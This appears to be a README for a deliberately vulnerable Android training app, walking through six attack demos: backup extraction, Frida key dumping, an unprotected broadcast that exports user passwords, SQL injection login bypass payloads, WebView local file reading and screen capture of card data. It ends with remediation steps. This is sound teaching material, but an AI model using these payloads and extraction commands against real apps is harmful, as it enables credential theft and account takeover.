# TrustMeBro - Vulnerability Testing Demo

## Prerequisites

## Backup configuration leak
**What it demonstrates**: Plaintext credentials exposed via device backup

### Demo Flow

```bash
# 1. In app: Tap "Step 1: Backup Configuration Leak"
# 3. Tap "Save" button to save credentials

# 4. Extract backup
adb backup -apk com.example.trustmebro -f backup.ab
# Tap "Back up my data" on emulator when prompted

# 5. Decompress
`python3 extract_ab.py backup.ab`

# 6. View plaintext credentials
ls -ltr apps/com.example.trustmebro/sp/
```

## Cryptographic Key Harvesting

**What it demonstrates**: Encryption keys in plaintext memory extractable via Frida

### Demo Flow

```bash
# 1. In app: Tap "Step 2: Cryptographic Key Harvesting"
# 2. Enter card: 4532 1234 5678 9010
# 3. Enter amount: 99.99
# 4. Tap "Tokenize" button
# View encrypted token in output

# 5. Start frida

# 6. Run Frida
frida -U -f com.example.trustmebro -l dump_keys.js

# 7. Tap "Decrypt" button - >  Keys exposed in plaintext memory
---
```

## System IPC Escalation

**What it demonstrates**: Unprotected broadcast receiver allows data export from any app

### Demo Flow (Option A - In App)

```bash
# 1. In app: Tap "Step 3: System IPC Escalation"
# 2. Enter format: csv
# 3. Tap "Export User Database"
# View exported user data with passwords:
#   john.smith@company.com,john_password_123
#   jane.doe@company.com,jane_secure_pass
#   admin@company.com,admin_master_2024
```

### Demo Flow (Option B - Via ADB Broadcast)

```bash
# Send broadcast from command line (simulates malicious app)
adb shell am broadcast \
  -a com.example.trustmebro.EXPORT_USERS \
  --es format csv \
  --es table users \
  --ez include_passwords true

# The app's receiver catches it automatically
# No permission checks required
```

---

## Database Leak & SQL Injection

**What it demonstrates**: String concatenation in SQL allows authentication bypass

### Demo Flow - Normal Login

```bash
# 1. In app: Tap "Step 4: Database Leak & SQL Injection"
# 2. Enter:
#    Username: admin
#    Password: admin123
# 3. Tap "Login"
```

### Demo Flow - SQL Injection Bypass #1

```bash
# 1. Username: admin' OR '1'='1
# 2. Password: anything
# 3. Tap "Login"
# Result: Logs in as admin (bypasses password check)
```

### Demo Flow - SQL Injection Bypass #2

```bash
# 1. Username: ' OR 1=1 --
# 2. Password: x
# 3. Tap "Login"
# Result: Logs in as first user (admin)
```

### Demo Flow - Extract Database

```bash
# Check logcat to see executed SQL
adb logcat | grep "TrustMeBro"

# Output shows:
# Query: SELECT * FROM admin_users WHERE username='admin' OR '1'='1' AND password='x'

# Extract database directly
adb pull /data/data/com.example.trustmebro/databases/admin_portal.db
sqlite3 admin_portal.db "SELECT * FROM admin_users;"

# Output:
# 1|admin|admin123|admin@company.com|super_admin|2024-05-20
# 2|john|john456|john@company.com|admin|2024-05-19
# 3|sarah|sarah789|sarah@company.com|moderator|2024-05-18
# 4|dev_user|dev_pass_2024|dev@company.com|developer|2024-05-15
```

---

## WebView Local File Hijacking

**What it demonstrates**: JavaScript can access local files and exfiltrate data

### Demo Flow - Normal Usage

```bash
# 1. In app: Tap "Step 5: WebView Local File Hijacking"
# 2. Click buttons:
#    - "Transfer Money" - prompts for amount
#    - "View Card Details" - shows card info
```

### Demo Flow - Extract JavaScript Variables

```bash
# 1. While app is open, run Chrome DevTools:
adb forward tcp:9222 localabstract:chrome_devtools_remote

# 2. Open Chrome: chrome://inspect
# 3. Click "inspect" on WebView
# 4. In Console tab, run:
window.accountToken
window.apiKey

# Output:
# "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjdXN0b21lcl9pZCI6IjEyMzQ1Njc4OTAifQ..."
# "sk-live-51Iv1oHGiW8h9K0L1M2N3O4P5Q6R7S8T9U0V1W2X3Y4Z5A6B7C8D9E0"
```

### Demo Flow - Inject Malicious Code

```javascript
// In Chrome DevTools Console, paste:
var img = new Image();
img.src = 'file:///data/data/com.example.trustmebro/shared_prefs/api_credentials.xml';
img.onload = function() {
    console.log("File accessible: " + img.src);
};
img.onerror = function() {
    console.log("File NOT accessible");
};
document.body.appendChild(img);

// If onload fires, file access confirmed
```

### Demo Flow - Extract Credentials

```bash
# WebView can read local files because:
# - JavaScript enabled
# - allowFileAccess = true
# - No Content Security Policy

# Verify:
adb pull /data/data/com.example.trustmebro/shared_prefs/api_credentials.xml

# WebView JavaScript can read this same file
```

## Compositor Overlay Capture

**What it demonstrates**: Missing FLAG_SECURE allows screen capture and overlay attacks

### Demo Flow - Payment Screen

```bash
# 1. In app: Tap "Step 6: Compositor Overlay Capture"
# 2. View order summary: $107.99
# 3. Enter payment details:
#    Card: 4532 1234 5678 9010
#    Expiry: 12/26
#    CVV: 123
# 4. Tap "Pay $107.99"
# 5. View success message
```

### Demo Flow - Screenshot

```bash
# While on payment entry screen:
adb shell screencap -p /sdcard/screenshot.png
adb pull /sdcard/screenshot.png

# Open image - shows:
# - Credit card number: 4532 1234 5678 9010
# - Expiry date: 12/26
# - CVV: 123
# (All visible because NO FLAG_SECURE)
```

### Demo Flow - Screen Recording

```bash
# Record while entering payment
adb shell screenrecord /sdcard/payment.mp4 --duration 15

# While recording, on emulator:
# - Enter card number: 4532 1234 5678 9010
# - Enter CVV: 123
# - Tap pay button

# Pull video
adb pull /sdcard/payment.mp4

# Video contains all sensitive details typed in real-time
```

### Demo Flow - Check Logcat

```bash
adb logcat | grep "TrustMeBro"

# Output shows:
# Processing payment - Card: 4532 1234 5678 9010 CVV: 123 Expiry: 12/26
```

### Demo Flow - Verify No FLAG_SECURE

```bash
# Check source code
grep -r "FLAG_SECURE" app/src/

# Result: Returns nothing (not used)
# This is the vulnerability
```

## Remediation (Quick Reference)

1. Set `android:allowBackup="false"` or use very specific dataExtractionRules
2. Use Android Keystore for key storage
3. Add signature verification to receivers
4. Use parameterized SQL queries
5. Disable JavaScript in WebView, use ContentSecurityPolicy
6. Add `FLAG_SECURE` to sensitive activities
```

